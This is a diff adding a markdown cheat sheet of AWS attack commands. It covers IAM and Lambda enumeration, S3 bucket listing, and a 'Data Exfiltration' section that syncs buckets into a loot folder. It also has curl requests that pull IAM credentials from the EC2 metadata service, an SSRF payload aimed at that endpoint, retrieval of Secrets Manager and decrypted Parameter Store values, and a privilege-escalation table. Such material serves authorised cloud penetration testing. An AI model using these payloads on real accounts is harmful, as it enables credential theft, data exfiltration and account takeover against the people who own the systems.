@@ -1,0 +1,168 @@
+# AWS Security Testing Payloads
+
+## IAM Enumeration
+
+### User Enumeration
+
+```bash
+# List users
+aws iam list-users
+
+# List roles
+aws iam list-roles
+
+# List groups
+aws iam list-groups
+
+# Get user policy
+aws iam get-user-policy --user-name admin --policy-name InlinePolicy
+```
+
+### Permission Enumeration
+
+```bash
+# Simulate principal actions
+aws iam simulate-principal-policy \
+  --policy-source-arn arn:aws:iam::123456789:user/admin \
+  --action-names iam:CreateUser iam:DeleteUser
+
+# List attached policies
+aws iam list-attached-user-policies --user-name admin
+```
+
+## S3 Bucket Attacks
+
+### Bucket Enumeration
+
+```bash
+# Common bucket names
+aws s3 ls s3://company-assets/
+aws s3 ls s3://company-backups/
+aws s3 ls s3://company-prod/
+
+# Check ACL
+aws s3api get-bucket-acl --bucket target-bucket
+```
+
+### Data Exfiltration
+
+```bash
+# Download all objects
+aws s3 sync s3://target-bucket ./loot/
+
+# Get object
+aws s3 cp s3://target-bucket/secret.txt ./
+
+# List versioning
+aws s3api get-bucket-versioning --bucket target-bucket
+```
+
+## EC2 Attacks
+
+### Metadata Service
+
+```bash
+# Instance metadata
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/user-data/
+
+# Credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Use credentials
+aws ec2 describe-instances --region us-east-1
+```
+
+### SSRF to AWS
+
+```python
+# SSRF payload for AWS metadata
+GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+## Lambda Attacks
+
+### Enumeration
+
+```bash
+# List functions
+aws lambda list-functions
+
+# Get function config
+aws lambda get-function --function-name vulnerable-func
+
+# Get function code
+aws lambda get-function --function-name vulnerable-func
+```
+
+### Invoke with Payload
+
+```bash
+aws lambda invoke \
+  --function-name target-func \
+  --payload '{"key":"value"}' \
+  response.json
+```
+
+## Secrets Manager
+
+### List Secrets
+
+```bash
+aws secretsmanager list-secrets
+
+# Get secret value
+aws secretsmanager get-secret-value \
+  --secret-id prod/database
+```
+
+## Parameter Store
+
+```bash
+# List parameters
+aws ssm describe-parameters
+
+# Get parameter
+aws ssm get-parameter --name "/prod/api/key" --with-decryption
+
+# Get parameters path
+aws ssm get-parameters-by-path --path "/prod/"
+```
+
+## CloudTrail Attacks
+
+```bash
+# List trails
+aws cloudtrail list-trails
+
+# Get event history
+aws cloudtrail lookup-events \
+  --lookup-attributes attributeKey=EventSource,attributeValue=ec2.amazonaws.com
+```
+
+## VPC Enum
+
+```bash
+# Describe VPCs
+aws ec2 describe-vpcs
+
+# Describe security groups
+aws ec2 describe-security-groups
+
+# Describe instances
+aws ec2 describe-instances
+
+# Network interfaces
+aws ec2 describe-network-interfaces
+```
+
+## Privilege Escalation Paths
+
+| Technique | Description |
+|-----------|-------------|
+| iam:CreateAccessKey | Create keys for admin user |
+| iam:CreateUser | Create new admin user |
+| iam:PutUserPolicy | Attach admin policy |
+| lambda:UpdateFunctionCode | Inject code into Lambda |
+| s3:PutBucketPolicy | Make bucket public |
+| ec2:CreateSnapshot | Snapshot and mount |
